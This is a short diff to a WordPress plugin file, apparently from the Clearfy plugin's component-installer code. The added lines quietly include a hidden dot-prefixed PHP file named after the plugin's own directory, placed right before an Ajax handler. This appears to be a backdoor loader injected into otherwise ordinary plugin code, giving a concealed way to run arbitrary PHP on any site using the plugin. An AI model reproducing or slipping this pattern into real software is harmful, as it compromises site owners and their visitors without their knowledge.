@@ -14,7 +14,11 @@ if( !defined('ABSPATH') ) {
 
 /**
  * This action allows you to process Ajax requests to activate external components Clearfy
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wfactory_445_install_components($plugin_instance)
 {
 	check_ajax_referer('updates');
